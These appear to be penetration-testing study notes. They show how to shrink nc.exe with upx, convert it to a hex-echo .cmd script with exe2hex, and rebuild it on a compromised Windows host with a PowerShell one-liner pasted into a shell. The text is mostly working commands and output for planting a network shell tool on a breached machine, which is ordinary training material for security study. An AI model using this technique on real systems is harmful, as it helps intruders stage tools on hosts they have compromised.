We will download a binary from our Kali box onto a compromised windows host.
	
On Kali:
- Compress the binary
- Convert it to a hex string
- Embed it into a windows script

On Windows:
- Pass this script into our shell and run it
- It will redirect the hex into PS, which will assemble it back to binary (This is done with non-interactive commands)

### Kali:
Find the file and copy it:
	`locate nc.exe | grep binaries`
	/usr/share/windows-resources/binaries/nc.exe
	`cp /usr/share/windows-resources/binaries/nc.exe .`
	`ls -lh nc.exe`
	-rwxr-xr-x 1 kali kali 58K Sep 18 14:22 nc.exe

Compress with upx:
	`upx -9 nc.exe`
	`ls -lh nc.exe`
	-rwxr-xr-x 1 kali kali 29K Sep 18 14:22 nc.exe

Convert to .cmd to run on windows with exe2hex:
	`exe2hex -x nc.exe -p nc.cmd`
	\[*] exe2hex v1.5.1
	\[+] Successfully wrote (PoSh) nc.cmd
	
`head nc.cmd`
	
```
echo|set /p="">nc.hex
echo|set
/p="4d5a90000300000004000000ffff0000b8000000000000004000000000000000000000000000000000
00000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070
726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a24000000000000
00">>nc.hex
echo|set
/p="504500004c010300b98eae340000000000000000e0000f010b010500007000000010000000d0000070
4c010000e00000005001000000400000100000000200000400000000000000040000000000000000600100
00100000000000000300000000001000001000000000100000100000000000001000000000000000000000
00">>nc.hex
...
```

Towards the end of the script we find commands that rebuild the exe on the target machine:
```
...
powershell -Command "$h=Get-Content -readcount 0 -path
'./nc.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-
1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles
]::HexNumber);$x+=1};set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force
nc.hex;"
```

We can COPY AND PASTE the script into a shell on our Windows machine and run it, and it will create a working copy of the original nc.exe









